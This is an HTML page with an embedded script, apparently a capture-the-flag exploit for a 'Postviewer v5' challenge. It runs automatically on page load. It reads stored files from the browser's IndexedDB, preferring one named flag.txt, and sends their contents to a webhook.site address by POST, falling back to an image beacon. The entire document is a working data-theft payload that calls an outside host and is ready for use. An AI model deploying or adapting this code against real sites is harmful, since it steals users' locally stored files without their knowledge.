<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Postviewer v5 - flag extractor</title>
  <style>
    body{font-family:system-ui,Arial;padding:18px}
    pre{background:#f6f6f6;padding:12px;border-radius:8px;white-space:pre-wrap}
    button{padding:8px 12px;margin-top:8px}
  </style>
</head>
<body>
  <h3>running extractor</h3>
  <div id="log"><pre>starting...</pre></div>
  <button id="manual">try now</button>

<script>
const LOG = (s) => {
  const p = document.querySelector('#log pre');
  p.textContent += '\n' + s;
  console.debug(s);
};

const EXFIL_URL = "https://webhook.site/90a00c64-2bf3-4683-ab13-2e3070d96349"; // your webhook

function openDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open("Files", 1);
    req.onerror = () => reject(new Error("indexedDB open failed"));
    req.onsuccess = () => resolve(req.result);
    req.onupgradeneeded = () => {
      // DB not ready yet
      LOG("DB upgrade needed; no files present yet.");
    };
  });
}

async function getIdFromFragment() {
  // if the page url is like /#file-<id>, use that id
  const h = location.hash || '';
  if (!h.startsWith('#file-')) return null;
  return h.slice(6);
}

function txGetAll(db, storeName) {
  return new Promise((resolve, reject) => {
    try {
      const tx = db.transaction(storeName, 'readonly');
      const store = tx.objectStore(storeName);
      const req = store.getAll();
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error);
    } catch (e) {
      reject(e);
    }
  });
}

function txGet(db, storeName, key) {
  return new Promise((resolve, reject) => {
    try {
      const tx = db.transaction(storeName, 'readonly');
      const store = tx.objectStore(storeName);
      const req = store.get(key);
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error);
    } catch (e) {
      reject(e);
    }
  });
}

async function readBlobAsTextOrB64(blob) {
  try {
    // try text
    if (blob.text) {
      const txt = await blob.text();
      return { text: txt, isBinary: false };
    }
    // fallback using FileReader
    return await new Promise((res, rej) => {
      const fr = new FileReader();
      fr.onload = () => res({ text: String(fr.result), isBinary: false });
      fr.onerror = () => rej(fr.error);
      fr.readAsText(blob);
    });
  } catch (e) {
    // binary fallback -> base64
    try {
      const ab = await blob.arrayBuffer();
      const b64 = btoa(String.fromCharCode(...new Uint8Array(ab)));
      return { text: b64, isBinary: true };
    } catch (ee) {
      return { text: "[unreadable blob]", isBinary: false };
    }
  }
}

async function exfiltrate(payloadObj) {
  LOG("exfiltrating to webhook...");
  try {
    // best-effort: no-cors so headless/sandboxed browsers will still send
    await fetch(EXFIL_URL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payloadObj)
    });
    LOG("POST attempted (no-cors). Check webhook.");
  } catch (e) {
    LOG("POST failed: " + e);
    // final fallback: image beacon with encoded payload (might be truncated)
    try {
      const q = encodeURIComponent(JSON.stringify(payloadObj)).slice(0, 1800);
      const img = new Image();
      img.src = EXFIL_URL + '/?p=' + q;
      document.body.appendChild(img);
      LOG("Beacon sent via image (may be truncated).");
    } catch (ee) {
      LOG("beacon fallback failed: " + ee);
    }
  }
}

async function findAndSendFlagOptions(db, targetId=null) {
  // If targetId provided, try that.
  if (targetId) {
    LOG("Trying id from fragment: " + targetId);
    try {
      const rec = await txGet(db, 'files', targetId);
      if (rec && rec.file) {
        LOG("Found file record for id (files store).");
        const blob = rec.file;
        const {text, isBinary} = await readBlobAsTextOrB64(blob);
        await exfiltrate({source:'ctf-extractor', method:'id-fragment', id: targetId, name: rec.file.name || 'flag.txt', isBinary, content: text});
        LOG("Done for fragment id.");
        return true;
      } else {
        LOG("No entry in files store for that id.");
      }
    } catch (e) {
      LOG("Error reading files store for id: " + e);
    }
  }

  // Fallback: search info store for a file named 'flag.txt' or for any public/cached .txt
  LOG("Scanning info store for likely candidates (name=='flag.txt' or .txt).");
  try {
    const infos = await txGetAll(db, 'info');
    if (!infos || !infos.length) {
      LOG("No entries found in info store.");
    } else {
      // prefer exact name flag.txt (case-insensitive)
      let candidate = infos.find(i => i.name && i.name.toLowerCase() === 'flag.txt');
      if (!candidate) {
        // try any .txt or any public file
        candidate = infos.find(i => i.name && i.name.toLowerCase().endsWith('.txt')) || infos.find(i => i.isPublic);
      }
      if (candidate) {
        LOG("Candidate found: id=" + candidate.id + " name=" + candidate.name);
        const rec = await txGet(db, 'files', candidate.id);
        if (rec && rec.file) {
          const blob = rec.file;
          const {text, isBinary} = await readBlobAsTextOrB64(blob);
          await exfiltrate({source:'ctf-extractor', method:'info-scan', id: candidate.id, name: candidate.name, isBinary, content: text});
          LOG("Done for candidate " + candidate.id);
          return true;
        } else {
          LOG("Found info entry but files store had no matching record.");
        }
      } else {
        LOG("No candidate found in info store.");
      }
    }
  } catch (e) {
    LOG("Error scanning info store: " + e);
  }

  return false;
}

async function runOnce() {
  try {
    const db = await openDB();
    LOG("Opened IndexedDB 'Files'.");

    // try id from fragment first
    const fragId = await getIdFromFragment();
    const ok = await findAndSendFlagOptions(db, fragId);
    if (ok) return true;

    // If not found, wait and retry a few times (bot may add the flag very shortly before)
    LOG("Not found yet; will retry for up to 120s...");
    const start = Date.now();
    while (Date.now() - start < 120000) {
      await new Promise(r => setTimeout(r, 2000));
      const ok2 = await findAndSendFlagOptions(db, fragId);
      if (ok2) return true;
    }
    LOG("Timeout: flag not found within retry window.");
    // report timeout to webhook
    await exfiltrate({source:'ctf-extractor', status:'timeout', url: location.href});
    return false;
  } catch (e) {
    LOG("Fatal error: " + e);
    try { await exfiltrate({source:'ctf-extractor', status:'error', error:String(e)}); } catch(e){}
    return false;
  }
}

document.getElementById('manual').addEventListener('click', () => {
  runOnce();
});

// auto-run after slight delay so the page UI can show up
setTimeout(() => { runOnce(); }, 500);
</script>
</body>
</html>
